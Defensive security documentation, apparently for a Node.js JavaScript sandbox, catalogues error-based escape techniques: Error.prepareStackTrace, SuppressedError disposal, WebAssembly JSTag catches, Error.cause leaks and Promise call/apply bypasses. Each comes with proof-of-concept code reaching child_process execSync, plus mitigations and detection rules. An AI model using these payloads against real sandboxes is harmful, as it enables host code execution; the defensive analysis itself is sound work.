# Error and Exception Sanitization

Exceptions and error containers as carriers of host references. Every value entering a `catch` must pass through `handleException`; the entries here are the paths that carried a raw host error, a host `Error.cause`, a host stack string, or a live proxy past it.

Defense invariants enforced by fixes in this family: 2, 3, 5 (see [Defense Invariants](../ATTACKS.md#defense-invariants)).

Categories in this file: [4](error-sanitization.md#attack-category-4-error-object-exploitation), [16](error-sanitization.md#attack-category-16-suppressederror-via-explicit-resource-management), [17](error-sanitization.md#attack-category-17-webassembly-jstag-exception-catch), [38](error-sanitization.md#attack-category-38-errorcause-host-reference-leak-to-sandbox), [39](error-sanitization.md#attack-category-39-host-promise-rejection-sanitizer-bypass-via-callapply-indirection), [48](error-sanitization.md#attack-category-48-host-filesystem-path-leak-via-host-realm-error-stack), [49](error-sanitization.md#attack-category-49-revisited-host-error-carrier-leaks-a-live-proxy-through-the-sanitizer-cycle-memo).

---

## Attack Category 4: Error Object Exploitation

**Advisories**: none

**Tests**: none linked

### Description

Errors carry stack traces, constructor references, and can trigger special V8 APIs. Attackers use errors as vehicles to access host-realm objects. The Error Generation Primitive (see Fundamentals) is the most common technique: setting `error.name = Symbol()` forces a host TypeError during V8's C++ stack formatting.

### Attack Flow

1. Create an error and manipulate it (e.g., set `name` to a Symbol, or override `prepareStackTrace`).
2. Access `.stack` to trigger V8's stack formatting, which may throw a host-realm TypeError.
3. Catch the TypeError (via catch block, promise rejection, or SuppressedError) to obtain a host-realm error object.
4. Traverse the host error's constructor chain to reach host `Function`.

### Canonical Examples

```javascript
// Error.prepareStackTrace to access CallSite objects
Error.prepareStackTrace = (err, callSites) => {
  return callSites.map(cs => cs.getThis()).find(x => x);
};
const { stack } = new Error();
// stack now contains host objects

// Stack overflow to trigger host error constructor
function recurse() { new Error().stack; recurse(); }
try { recurse(); }
catch (e) {
  // e is host RangeError with host constructor
  e.constructor.constructor("return process")();
}

// Error in Promise rejection path (uses Error Generation Primitive)
async function fn() {
  const e = new Error();
  e.name = Symbol(); // Forces host TypeError during string conversion
  return e.stack;
}
fn().catch(hostError => {
  hostError.constructor.constructor("return process")();
});
```

### Why It Works

V8's `Error.prepareStackTrace` API provides access to CallSite objects that reference the actual `this` value of each stack frame. Stack overflow errors are created by the engine itself and may carry host-realm prototypes. The Error Generation Primitive (`e.name = Symbol(); e.stack`) forces V8's C++ code to throw a TypeError during string formatting; if this happens in host-side code (like `prepareStackTraceCallback`), the TypeError is a host-realm error.

### Mitigation

`Error.prepareStackTrace` is initialised to `defaultSandboxPrepareStackTrace` at sandbox bootstrap (post-GHSA-v27g hardening) and the property descriptor's setter substitutes the safe default whenever sandbox code assigns a non-function value (`undefined`, `null`, etc.). V8 therefore never falls through to Node's host-side `prepareStackTraceCallback` (which throws on Symbol-named errors and emits absolute host paths). `defaultSandboxPrepareStackTrace` itself handles Symbol names, Proxy objects, and other exotic types without throwing. CallSite metadata getters (`getFileName`, `getLineNumber`, `getFunctionName`, etc.) redact host frames; `getEvalOrigin` redacts unconditionally because its return string can embed a host path. CallSite `getThis()` and `getFunction()` always return `undefined`. `SuppressedError` and `AggregateError` are in `errorsList` in `bridge.js` so their prototypes are proto-mapped and their bridge-crossing instances structurally-collapsed.

### Detection Rules

- **`Error.prepareStackTrace`** assignment -- accessing V8 stack internals.
- **Recursive functions designed to cause stack overflow** -- intentional `RangeError` creation.
- **`error.name = Symbol()`** -- forces TypeError during string coercion (Error Generation Primitive).
- **Accessing `.stack` property on errors** in conjunction with prepareStackTrace.
- **Errors with unusual prototype manipulation** before throwing.
- **`Error.cause`** -- set by user code (not V8 internals), so `ensureThis` handles it; but worth noting as a potential carrier of host references.

---

## Attack Category 16: SuppressedError via Explicit Resource Management

**Advisories**: none

**Tests**: none linked

**Uses**: [Category 4: Error Object Exploitation](error-sanitization.md#attack-category-4-error-object-exploitation), [Category 12: Code Transformation Bypass](transformer-and-modules.md#attack-category-12-code-transformation-bypass)

### Description

The Explicit Resource Management proposal (ES2024) introduces `DisposableStack`, `AsyncDisposableStack`, and the `using` declaration. When multiple errors occur during resource disposal, V8 wraps them in a `SuppressedError` with `.error` and `.suppressed` properties. These properties can contain host-realm errors that bypass bridge sanitization.

### Attack Flow

1. Create a disposable resource whose `Symbol.dispose` method triggers the Error Generation Primitive (`e.name = Symbol(); e.stack`), producing a host TypeError.
2. Use a `using` declaration or `DisposableStack.defer()` so that disposal happens automatically.
3. Arrange for a second error (e.g., `throw null`) so V8 wraps both in a `SuppressedError`.
4. Catch the `SuppressedError` -- its `.error` or `.suppressed` contains the unsanitized host TypeError.
5. Traverse `.error.constructor.constructor` to reach host `Function`.

### Canonical Examples

```javascript
// DisposableStack attack
const ds = new DisposableStack();
ds.defer(() => { throw null; });
ds.defer(() => {
  const e = Error();
  e.name = Symbol();
  e.stack;
});
try {
  ds.dispose();
} catch(e) {
  // e.suppressed is the host TypeError (unsanitized)
  const Function = e.suppressed.constructor.constructor;
  const process = new Function("return process;")();
  process.mainModule.require("child_process").execSync("...");
}

// 'using' declaration attack (bypasses transformer -- ecmaVersion 2022)
obj = {[Symbol.dispose]() {
    const e = new Error();
    e.name = Symbol();
    return e.stack;
}};
try {
    eval("{using a = obj;throw null;}");
} catch(e) {
    e.error.constructor.constructor("return process")()
      .mainModule.require('child_process').execSync('...');
}

// AsyncDisposableStack attack
const ds = new AsyncDisposableStack();
ds.defer(async () => { throw null; });
ds.defer(async () => {
  const e = Error();
  e.name = Symbol();
  e.stack;
});
try {
  await ds.disposeAsync();
} catch(e) {
  const Function = e.suppressed.constructor.constructor;
  Function("return process")().mainModule.require("child_process").execSync("...");
}
```

### Why It Works

V8 creates `SuppressedError` instances using the sandbox context's intrinsic constructor during resource disposal. The resulting object is a sandbox object, so `ensureThis` returns it as-is. However, the `.error` and `.suppressed` properties are set by V8's internal code and may contain **host-realm** errors. Since these properties are accessed as regular property reads on a sandbox object (not through a bridge proxy), the host errors are returned without sanitization.

The `using` declaration bypasses the transformer because Acorn's `ecmaVersion: 2022` does not parse ES2024 syntax -- the implicit catch semantics of `using` are invisible to instrumentation.

Note: `Error.cause` (ES2022) is a related concern that **was** assumed safe because the bridge `get` trap wraps property reads. It is not: the wrap is functional, so the sandbox can pivot through `e.cause.mainModule.require(...)` even after wrapping. See [Category 38](error-sanitization.md#attack-category-38-errorcause-host-reference-leak-to-sandbox) for the full analysis and the chokepoint extension in `handleException` that strips `.cause` from host-wrapped carriers.

### Mitigation

Three layers, structurally:

1. **`handleException` recursion**: detects `SuppressedError` / `AggregateError` instances by prototype check and recursively sanitizes `.error` / `.suppressed` / `.errors[]` via `ensureThis`. `SuppressedError` is also added to `errorsList` in `bridge.js`. Cycle detection via WeakMap prevents infinite recursion.
2. **Sandbox-side `Promise.prototype.then` / `.catch` overrides** route every callback through `handleException` for sandbox-realm promises (lines 199-228 of `setup-sandbox.js`).
3. **Bridge-level host-Promise interception** (GHSA-55hx supplementary fix): when sandbox code invokes a host-realm `Promise.prototype.then` / `.catch` / `.finally` (for example, via an embedder-exposed `async () => {}` whose returned promise is host-realm), the bridge `apply` trap recognizes the call (identity check against cached `otherGlobalPrototypes.Promise` methods) and wraps each sandbox-supplied callback with a sanitizing closure that pipes its argument through `handleException` (rejection) or `ensureThis` (fulfillment) before the user code runs. This closes the structural class where host machinery (PromiseReactionJob / PromiseResolveThenableJob) schedules sandbox callbacks against raw host rejection values, bypassing the sandbox-side override entirely. Setup is one-shot via `bridge.setHostPromiseSanitizers(handleException, ensureThis)` from `setup-sandbox.js`.

### Detection Rules

- **`new DisposableStack()`** or **`new AsyncDisposableStack()`** with `defer()`.
- **`using` declarations** in `eval()` -- triggers `Symbol.dispose` on scope exit.
- **`await using` declarations** -- triggers `Symbol.asyncDispose`.
- **`e.suppressed.constructor`** or **`e.error.constructor`** in catch blocks.
- **`SuppressedError`** combined with `e.name = Symbol()`.
- **Host-realm async function exposed via `{sandbox: {f: async () => {}}}`** chained with `.finally` / `.catch` to deliver SuppressedError -- now sanitized at the bridge boundary.

---

## Attack Category 17: WebAssembly JSTag Exception Catch

**Advisories**: none

**Tests**: none linked

**Uses**: [Category 4: Error Object Exploitation](error-sanitization.md#attack-category-4-error-object-exploitation), [Category 12: Code Transformation Bypass](transformer-and-modules.md#attack-category-12-code-transformation-bypass)

### Description

`WebAssembly.JSTag` (available since ~Node 23) is a special tag that allows WebAssembly exception handling (`try_table`/`catch`) to catch JavaScript exceptions thrown during imported function calls. Since the transformer only instruments JavaScript `catch` clauses, exceptions caught in WebAssembly completely bypass `handleException()` sanitization.

### Attack Flow

1. **Error setup**: `err.name = Symbol()` causes `err.stack` to throw a host TypeError (Error Generation Primitive).
2. **Wasm module creation**: A WebAssembly module imports a `trigger` function that accesses `err.stack` and `WebAssembly.JSTag` as a tag for catching JS exceptions.
3. **Wasm exception catch**: The module's exported function uses `try_table/catch` with JSTag. When `trigger()` throws the host TypeError, wasm catches it and returns the exception value as an `externref`.
4. **Bypass**: The transformer only instruments JavaScript `catch` blocks. Wasm exception handling is a separate mechanism -- the transformer has zero visibility into wasm bytecode. The caught host error is returned raw and unsanitized.
5. **Escape**: `hostError.constructor.constructor("return process")()` -> RCE.

### Canonical Examples

```javascript
const err = new Error("x");
err.name = Symbol();

const wasm = new Uint8Array([
    0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
    0x01,0x0c,0x03,0x60,0x00,0x00,0x60,0x00,0x01,0x6f,0x60,0x01,0x6f,0x00,
    0x02,0x19,0x02,
    0x03,0x65,0x6e,0x76,0x07,0x74,0x72,0x69,0x67,0x67,0x65,0x72,0x00,0x00,
    0x02,0x6a,0x73,0x03,0x74,0x61,0x67,0x04,0x00,0x02,
    0x03,0x02,0x01,0x01,
    0x07,0x0f,0x01,
    0x0b,0x63,0x61,0x74,0x63,0x68,0x5f,0x65,0x72,0x72,0x6f,0x72,0x00,0x01,
    0x0a,0x12,0x01,0x10,0x00,
    0x02,0x6f,0x1f,0x40,0x01,0x00,0x00,0x00,0x10,0x00,0x00,0x0b,0x00,0x0b,0x0b
]);

const instance = new WebAssembly.Instance(
    new WebAssembly.Module(wasm),
    { env: { trigger() { err.stack; } }, js: { tag: WebAssembly.JSTag } }
);

const hostError = instance.exports.catch_error();
const p = hostError.constructor.constructor("return process")();
p.mainModule.require('child_process').execSync('...');
```

### Why It Works

The entire exception sanitization strategy is built on instrumenting JavaScript `catch` clauses via the transformer. WebAssembly introduces a parallel exception-catching mechanism that operates at the bytecode level, completely outside the transformer's scope. Without `JSTag`, wasm can only catch custom wasm exceptions (not JS exceptions), and `catch_all` does not expose the exception value.

### Mitigation

`WebAssembly.JSTag` is deleted from the sandbox at initialization in `setup-sandbox.js`. Without JSTag, wasm code cannot catch JavaScript exceptions -- `catch_all` provides no value access, and `catch_all_ref` requires JSTag for `exn.extract`. The tag is a V8 internal and cannot be reconstructed by user code.

### Detection Rules

- **`WebAssembly.JSTag`** -- accessing the JS exception tag.
- **`WebAssembly.Instance`** with import objects containing `tag:` properties.
- **Wasm modules with `try_table`/`catch` instructions**.
- **Combination of wasm exception handling + Error Generation Primitive**.
- **`instance.exports.*` returning externref values**.

---

## Attack Category 38: `Error.cause` Host Reference Leak to Sandbox

**Advisories**: none

**Tests**: none linked

**Uses**: [Category 4: Error Object Exploitation](error-sanitization.md#attack-category-4-error-object-exploitation), [Category 16: SuppressedError via Explicit Resource Management](error-sanitization.md#attack-category-16-suppressederror-via-explicit-resource-management)

### Description

ES2022 added `Error.cause`, a free-form property carrying an arbitrary object reference describing the underlying reason for an error (`new Error('wrap', { cause: original })`). When an embedder-exposed host helper throws an Error with `.cause` set to a powerful host reference (canonically `process`, but anything reachable from the embedder's closure qualifies — `require('child_process')`, a host `Module` instance, an internal config containing keys), the host Error crosses the bridge via `thisFromOtherForThrow` and reaches the sandbox catch block as a bridge proxy.

The bridge `get` trap wraps `.cause` on read — the resulting proxy passes `isProxy === true` — but **the wrap is functional**. The bridge's design goal is realm isolation, not capability restriction: sandbox code can chain `e.cause.mainModule.require('child_process').execSync(...)` through proxy `apply` traps and reach host RCE. The proxy hands off arguments and return values through the bridge correctly; it does not block the embedder-exposed function from being called.

The embedder almost never intends `.cause` to expose live host references. Error chaining is idiomatic in modern Node — `try { x() } catch (e) { throw new Error('wrap', { cause: e }) }` — and the chained `e` is frequently a Node-internal error whose own internal fields point at `process`, `Module`, or other powerful host objects. CVE class is sandbox escape via an under-audited ES2022 channel.

CVSS 3.1: 9.9 / Critical (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H). CWE-693 (Protection Mechanism Failure).

### Attack Flow

1. Embedder exposes a host function via `sandbox: { hostFn: () => { throw new Error('msg', { cause: process }) } }`. The cause may be set by the embedder directly or by Node-internal error chaining the embedder wraps.
2. Sandbox calls the function; host throws.
3. `thisFromOtherForThrow` wraps the host `Error` as a bridge proxy. The proxy's underlying object is the raw host Error.
4. Sandbox catch block reads `e.cause`. The proxy `get` trap fetches the host `.cause` (`process`) and wraps it through `thisFromOther`, returning a bridge proxy of `process` to sandbox code.
5. Sandbox code drives the wrapped `process` through proxy `get` / `apply` traps: `e.cause.mainModule.require('child_process').execSync('...')`. Each step routes through host realm; `execSync` runs with host privileges.

### Canonical Examples

```javascript
// Direct host process leak
const vm = new VM({
    sandbox: { hostFn: () => { throw new Error('fail', { cause: process }); } },
});
vm.run(`
    try { hostFn(); } catch (e) {
        e.cause.mainModule.require('child_process').execSync('id');
    }
`);

// Indirect leak via Node-internal error chaining
const vm = new VM({
    sandbox: {
        hostFn: () => {
            try { require('fs').readFileSync('/no/such'); }
            catch (inner) { throw new Error('wrap', { cause: inner }); }
        },
    },
});
// Inner ENOENT carries no powerful reference here, but other Node-internal
// errors (e.g. `vm`, `module`, `worker_threads` paths) do.

// Frozen / non-configurable cause — bypasses naive `delete e.cause` fixes
const vm = new VM({
    sandbox: {
        hostFn: () => {
            const e = new Error('frozen');
            Object.defineProperty(e, 'cause', { value: process, configurable: false, writable: false });
            throw e;
        },
    },
});

// Accessor-shaped cause — bypasses fixes that only delete data properties
const vm = new VM({
    sandbox: {
        hostFn: () => {
            const e = new Error('getter');
            Object.defineProperty(e, 'cause', { get: () => process, configurable: true });
            throw e;
        },
    },
});

// Nested cause chain — fix must recurse
const vm = new VM({
    sandbox: {
        hostFn: () => {
            const inner = new Error('inner', { cause: process });
            throw new Error('outer', { cause: inner });
        },
    },
});
// e.cause.cause.mainModule... still pivots without recursive sanitization.

// SuppressedError / AggregateError sub-error with cause — must inherit walk
const vm = new VM({
    sandbox: { hostFn: () => { throw new Error('h', { cause: process }); } },
});
vm.run(`
    try {
        try { hostFn(); } catch (i) { throw new SuppressedError(i, new Error('s'), 'm'); }
    } catch (e) { e.error.cause.mainModule.require('child_process').execSync('...') }
`);

// TOCTOU getter — bypasses fixes that read .cause once and skip the strip on
// primitives. The first read returns undefined (defeating the guard); every
// subsequent read returns process. Defended by stripping unconditionally with
// a sealed (non-configurable, non-writable) descriptor.
const vm = new VM({
    sandbox: {
        hostFn: () => {
            let reads = 0;
            const e = new Error('toctou');
            Object.defineProperty(e, 'cause', {
                get() { return reads++ === 0 ? undefined : process; },
                configurable: true,
            });
            throw e;
        },
    },
});

// Lying Proxy host-carrier — bypasses fixes that trust defineProperty's
// boolean return value. The Proxy's defineProperty trap returns true without
// modifying the target. The configurable-strip would proceed thinking it
// succeeded; subsequent .cause reads still go through the get trap to the
// underlying process. Defended by the non-configurable seal: ECMA-262 §10.5.6
// forces an invariant throw because Desc.configurable is false but target's
// existing descriptor is configurable.
const vm = new VM({
    sandbox: {
        hostFn: () => {
            const realErr = new Error('proxy-lies');
            realErr.cause = process;
            throw new Proxy(realErr, {
                defineProperty(t, p, d) { return p === 'cause' ? true : Reflect.defineProperty(t, p, d); },
            });
        },
    },
});

// SuppressedError.error / .suppressed / AggregateError.errors accessor TOCTOU
// — bypasses the read-then-recurse-then-assign pattern. The recursive call
// reads the accessor once (benign), recurses harmlessly. The assign back is a
// SET, which silently no-ops on a getter-only accessor. Subsequent sandbox
// reads invoke the accessor again and return process. Defended by snapshot-
// and-rebuild: on host-wrapped carriers, sub-errors are read once each and a
// fresh sandbox-realm SuppressedError / AggregateError is constructed as the
// replacement, dropping the original carrier.
const vm = new VM({
    sandbox: {
        hostFn: () => {
            const e = new SuppressedError(new Error('a'), new Error('b'), 'msg');
            let reads = 0;
            Object.defineProperty(e, 'error', {
                get() { return reads++ === 0 ? new Error('benign') : process; },
                configurable: true,
            });
            throw e;
        },
    },
});
```

### Why It Works

The bridge invariant ["No host-realm object reaches sandbox code unwrapped"](../ATTACKS.md#defense-invariants) (Defense Invariant #1) was satisfied — `.cause` returned a bridge proxy. But the related invariant ["All caught exceptions are sanitized"](../ATTACKS.md#defense-invariants) (Defense Invariant #2) and especially #3 (cross-realm error containers are recursively sanitized) had a documented gap: the `handleException` chokepoint only recursed into `SuppressedError.{error,suppressed}` and `AggregateError.errors[]`. `.cause` was the third ES2022 / 2024 error-chain channel and went unaudited.

A second misconception in the prior architecture: wrapping a host reference is sufficient to neutralize it. For sandbox-exposed values (`sandbox: { someConfig }`), this is true by intent — the embedder explicitly granted access. For `.cause`, the embedder did not. The wrap therefore must be supplemented by stripping the property entirely from host-realm carriers.

### Mitigation

Centralize in `handleException` (the existing exception chokepoint). The new helper `sanitizeErrorCause` runs **before** the SuppressedError / AggregateError proto walk, so SuppressedError / AggregateError carriers also get their `.cause` stripped, and the recursive walks pick up `.cause` on every sub-error.

Two branches by carrier realm:

1. **Host-wrapped carrier** (`e.isProxy === true`) — overwrite host-side `.cause` with `undefined` via `localReflectDefineProperty` using a **sealed descriptor** (`writable: false, configurable: false`). This routes through the proxy `defineProperty` trap to `otherReflectDefineProperty` and pins a fresh data property on the underlying host Error. The non-configurable + non-writable choice is load-bearing: it weaponizes two ECMA-262 Proxy invariants against attacker-controlled host carriers:

   - **§10.5.6 ProxyDefineOwnProperty**: if `Desc.[[Configurable]]` is false and the target's existing descriptor is configurable, the engine throws regardless of the trap's return value. A lying `defineProperty` trap (e.g., `new Proxy(realErr, { defineProperty: () => true })`) cannot pretend success without actually modifying the target — the engine catches the invariant violation and the fallback substitution fires.

   - **§10.5.8 ProxyGet**: once the property is non-configurable and non-writable, the trap MUST return `SameValue(target.value)`. A `get` trap that lies about the value triggers `TypeError`. So subsequent sandbox reads of `.cause` either return `undefined` or throw — both safe.

2. **Strip fails** (engine threw on invariant violation, host property is sealed non-configurable, or any other failure) — the carrier itself is unsafe, so a **fresh sandbox-realm `Error` is substituted**, preserving only the textual `.message`. Sandbox catch code sees a different error type but no pivot reference.

3. **Sandbox-realm carrier** — recursively sanitize: read `e.cause` once, recurse via `handleException`, then re-install the sanitized value as a data property to defeat sandbox-side accessor `.cause` definitions. Cycle detection via the existing `visited` `WeakMap` prevents infinite recursion on `a.cause = b; b.cause = a`.

For **`SuppressedError` and `AggregateError` carriers**, the same TOCTOU class applies to `.error`, `.suppressed`, and `.errors[]` slots. The original recursive pattern was `e.error = handleException(e.error, visited)` — a single read invoked the host getter (returning a benign value that recursed harmlessly), and the assignment back silently no-op'd against a getter-only accessor. The accessor remained live; the next sandbox read returned a host reference.

The fix on host-wrapped carriers **snapshots sub-errors via a single read each, sanitizes them, and constructs a fresh sandbox-realm replacement of the same type** (`new LocalSuppressedError(...)` / `new LocalAggregateError(...)`). The original carrier — which may have any number of attacker-controlled accessors — is dropped entirely. Sandbox receives a stable sandbox-realm carrier whose sub-error slots are plain data properties on the new instance, immune to host-side TOCTOU.

For **arbitrary own properties** on host-wrapped error carriers (`err.detail = process`, `err.originalError = require('child_process')`, etc.), the spec-defined-slot fixes above do not generalize. Node libraries routinely attach host references via custom property names as part of error-chaining conventions, and any such property reaches sandbox as a functional bridge proxy — same escape primitive as the original `.cause` channel. `sanitizeHostOwnProps` runs on every host-wrapped non-Suppressed/non-Aggregate carrier reaching `handleException`, enumerates own keys via `Reflect.ownKeys`, and seals each property with the same non-configurable + non-writable descriptor used for `.cause`: primitive values are locked to the first-read primitive (preserves `message`/`stack`/`name`/`code`/`errno`/`syscall`/`path` and any other diagnostic primitive), non-primitives are replaced with `undefined`. The ECMA-262 §10.5.6 invariant catches lying-Proxy carriers on every key; the §10.5.8 invariant locks subsequent reads to the sealed value. Seal failure substitutes the carrier with a fresh sandbox-realm Error preserving the captured message.

For **prototype-inherited host references**, own-key sealing is structurally insufficient. `Reflect.ownKeys` does not report inherited properties, so a host carrier whose prototype was replaced — `Object.setPrototypeOf(hostErr, { leak: process })` — passed through `sanitizeHostOwnProps` untouched, and `e.leak` still resolved to a live bridge proxy: `e.leak.mainModule.require('child_process').execSync(...)` is full RCE, and `e.leak.pid` / `e.leak.env` are host information disclosure on their own.

The enumeration cannot simply be widened to walk the chain: the chain is attacker-shaped, arbitrarily deep, and each link may itself be a lying Proxy, so any walk is a TOCTOU surface rather than a fix. Instead the carrier is **rebuilt in the sandbox realm**. `sanitizeHostOwnProps` constructs a fresh sandbox-realm error and copies across only the primitive own properties it has already sealed (`message` through the constructor, plus `name` / `stack` / `code` / `errno` / `syscall` / `path` and any other primitive the host attached). The host prototype chain is discarded wholesale, so the returned object is *structurally incapable* of referencing the host realm — no enumeration, and therefore no enumeration gap. This is the same snapshot-and-rebuild strategy already applied to `SuppressedError` / `AggregateError` carriers, generalized to every host-wrapped carrier.

Two details in the rebuild are load-bearing:

- **The error constructors are captured at module load** (`LocalTypeError`, `LocalRangeError`, `LocalReferenceError`, `LocalSyntaxError`, `LocalEvalError`, `LocalURIError`), beside `LocalError` and for the same reason `localStringStartsWith` is captured for [Category 8](host-reference-primitives.md#attack-category-8-cross-realm-symbol-extraction-from-host-objects). The rebuild runs at exception-handling time, long after guest code has executed; reading the mutable sandbox globals there would let `RangeError = function () { ... }` from inside the sandbox execute attacker code *inside the sanitizer* and dictate the value it returns — reintroducing the very escape the helper exists to prevent. See [Defense Invariant #6](../ATTACKS.md#defense-invariants).

- **The subclass is resolved from the carrier's `name` string, not `instanceof`.** A host-wrapped carrier's prototype chain terminates at the *host* `RangeError.prototype`, never the sandbox's, so `instanceof` against a sandbox constructor is false for every host error and the subclass would silently collapse to plain `Error`. Name matching is also prefix-based, because Node ≤ 11 reports internal errors as `"RangeError [ERR_INVALID_OPT_VALUE]"`; an exact comparison degrades every Node-internal error to plain `Error` on those runtimes. `name` is attacker-controllable, but the only thing it can influence is which of six benign sandbox-realm constructors is used.

The fix restores **[Defense Invariant #3](../ATTACKS.md#defense-invariants)** at the right chokepoint: `Error.cause` joins `SuppressedError.{error,suppressed}` and `AggregateError.errors[]` as a recognized sub-error channel, and all four channels are now defended against the same TOCTOU / lying-Proxy class. The published wording of Invariant #3 was already aspirationally correct — this fix makes the implementation match. The carrier rebuild extends that guarantee from *enumerated channels* to *the whole object graph reachable from a host carrier*.

### Detection Rules

- **`{ cause: process }` / `{ cause: require('...') }` in any host-exposed throw site** — direct leak of a powerful host reference through the ES2022 channel.
- **`throw new Error('msg', { cause: e })` in embedder code that wraps caught Node-internal errors** — Node-internal errors carry references to `Module`, `process`, internal config; chaining them propagates the leak.
- **`Object.defineProperty(err, 'cause', { ... })` in host code** — both the non-configurable and accessor variants are bypass primitives if the fix is naive (`delete`-only).
- **`e.cause.X.Y(...)` pattern in sandbox code** — pivot chain through proxy-wrapped `.cause`.
- **`e.error.cause.X` / `e.errors[i].cause.X` patterns** — pivot chains through SuppressedError / AggregateError sub-errors carrying their own `.cause`.
- **`Object.setPrototypeOf(err, { ... })` on any host error before it crosses the bridge** — moves the payload out of own-key range; the reference is reachable in sandbox as an ordinary inherited property (`e.leak`), including via accessors and symbol keys.
- **`e.<anyKey>.mainModule` / `.env` / `.pid` in sandbox code where `<anyKey>` is not a spec-defined error slot** — pivot through an arbitrary own *or inherited* carrier property.

### Considered Variants

- **Arbitrary `.foo = process` on host-wrapped errors** — now covered by `sanitizeHostOwnProps`. Originally argued out of scope on the assumption that embedders setting arbitrary properties were exposing references intentionally; in practice, Node-internal error chaining and library wrappers routinely attach host references to custom property names (`err.detail`, `err.originalError`, `err.context`, etc.) without considering the sandbox trust boundary. The own-property enumeration covers all string and symbol keys uniformly; primitive diagnostic info survives, non-primitive host references are stripped.
- **`.cause` set by V8 internals** — not currently a known path. If a future Node version starts populating `.cause` on internal errors with host references (analogous to how SuppressedError carries them), the fix already covers it because the recursion runs on every error reaching `handleException`.
- **Read via `Reflect.get(err, 'cause')` from a host-side script the sandbox can invoke** — same path through the proxy `get` trap; same defense. Reflect identity is captured at init time (Defense Invariant #8), so sandbox cannot substitute a host Reflect.

---

## Attack Category 39: Host-Promise Rejection Sanitizer Bypass via `call`/`apply` Indirection

**Advisories**: GHSA-647f-g98j-qq25

**Tests**: test/ghsa/GHSA-647f-g98j-qq25/

**Uses**: [Category 38: `Error.cause` Host Reference Leak to Sandbox](error-sanitization.md#attack-category-38-errorcause-host-reference-leak-to-sandbox)

**Supersedes**: closes the delivery gap in the [Category 38](error-sanitization.md#attack-category-38-errorcause-host-reference-leak-to-sandbox) fix. The `handleException`-based rebuild in Category 38 only runs when the bridge's host-Promise sanitizer actually wraps the sandbox callback; this category is the invocation path where that wrap was skipped. Structurally identical in shape to [Category 37: Stacked Indirection Bypass of Host Prototype Mutator Peel](host-prototype-mutation.md#attack-category-37-stacked-indirection-bypass-of-host-prototype-mutator-peel) — a direct-target-only identity check at the apply trap, defeated by `Function.prototype.call`/`.apply` indirection.

### Description

The Category 38 fix rebuilds capability-bearing host rejection values as fresh sandbox-realm errors (stripping own properties such as `err.detail = process`, the host prototype, and the `Error.cause`/`SuppressedError`/`AggregateError` side-channels) before a sandbox `onRejected` callback runs. That rebuild is delivered by the bridge apply trap: when the sandbox calls `.then` / `.catch` on a host Promise, the trap wraps the sandbox-supplied callbacks so their argument flows through `hostPromiseSanitizeReject` (`handleException(from(e))`) first.

The gate identity-checked only the **direct** apply target — `isHostPromiseThen(object)` / `isHostPromiseCatch(object)`. The sandbox's `Function.prototype.call` / `.apply` are `connect()`ed to the host's, so registering the handler through indirection (`p.then.call(p, undefined, cb)`, `p.then.apply(p, [undefined, cb])`, stacked `p.then.call.call(...)`, and mixed `call`/`apply` nestings) makes the apply-trap target host `Function.prototype.call`/`.apply` — not `then`/`catch`. The gate misses, no callback is wrapped, and the raw host rejection reaches the sandbox `onRejected` as a functional bridge proxy. A rejection whose own property references a host object then pivots to RCE: `e.detail.mainModule.require('child_process').execSync(...)`.

Only `call`/`apply` indirection is affected. Sandbox `Reflect.apply(p.then, …)` and `p.then.bind(p, …)()` re-enter the apply trap with the **direct** target already resolved to host `then`/`catch`, so they were always covered.

CVSS 3.1: 10.0 / Critical (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H). CWE-94 (Code Injection), CWE-693 (Protection Mechanism Failure).

### Attack Flow

1. Embedder exposes an async host helper — `sandbox: { fetchUser: async () => { const e = new Error('x'); e.detail = process; throw e; } }` — or a NodeVM external module's async method. The returned host Promise crosses the bridge as a proxy.
2. Sandbox obtains the host-Promise proxy `p` and registers `onRejected` through `call`/`apply` indirection: `p.then.call(p, undefined, cb)`.
3. The apply trap fires with `object = ` host `Function.prototype.call`, `context = ` the host `then`, `args = [p, undefined, cb]`. The direct-target check `isHostPromiseThen(object)` is false → callbacks not wrapped.
4. Host Promise machinery (`PromiseReactionJob`) runs `cb` with the **raw** host rejection value in a microtask after `run()` returns.
5. `cb` reads `e.detail` — a functional bridge proxy of host `process` — and drives `e.detail.mainModule.require('child_process').execSync(...)` to host RCE.

### Canonical Examples

```javascript
const vm = new VM({ sandbox: {
    fetchUser: async () => { const err = new Error('db'); err.detail = process; throw err; },
}});
vm.run(`
    const p = fetchUser();
    p.then.call(p, undefined, (e) => {                 // .call indirection skips the sanitizer
        e.detail.mainModule.require('child_process').execSync('id');
    });
`);
// Equivalent bypasses: p.then.apply(p, [undefined, cb]);
//                      p.then.call.call(p.then, p, undefined, cb);   (stacked)
//                      p.then.apply.call(p.then, p, [undefined, cb]);(mixed)
//                      p.catch.call(p, cb);  p.catch.apply(p, [cb]);
```

### Mitigation

The direct-target-only gate is replaced by `normalizeHostPromiseCallbacks` in the `lib/bridge.js` apply trap. Because the apply trap is the single chokepoint every sandbox-initiated host-function call passes through, indirection only repacks `(object, context, args)` — the trap can reconstruct the *effective* call:

- **Peel `call`/`apply` in a bounded loop.** Host `Function.prototype.call`/`.apply` are cached individually (`otherFunctionCall`/`otherFunctionApply`) — they must be distinguished because their argument shapes differ (`call(this, ...args)` keeps the callbacks in the same list, shifted; `apply(this, argsArray)` nests them one array deeper). Each iteration unwinds one layer via cached function identity (`otherFromThis`), never by reading an attacker getter (TOCTOU-safe).
- **Wrap at the effective slots.** When the peel resolves to host `then` (wrap `onFulfilled` + `onRejected`) or `catch` (wrap `onRejected`), the callbacks are wrapped through the same `makeSanitizedPromiseCallback` used for the direct call, so the Category 38 rebuild runs regardless of invocation shape.
- **`.apply` nested arrays are snapshotted** into fresh, trap-owned, getter-free storage (`copyPromiseArgArray`, `length > 65535` bail) before the wrapped callbacks are written back, so the host machinery cannot observe a value different from the one vetted, and no raw sandbox object is mutated.
- **Fail closed on depth.** The peel loop is bounded (`MAX_PROMISE_PEEL = 64`); exceeding it **throws `VMError`** rather than forwarding a possibly-unwrapped callback. Legitimate code never stacks `call`/`apply` anywhere near that deep, and a silent bail would be fail-open.

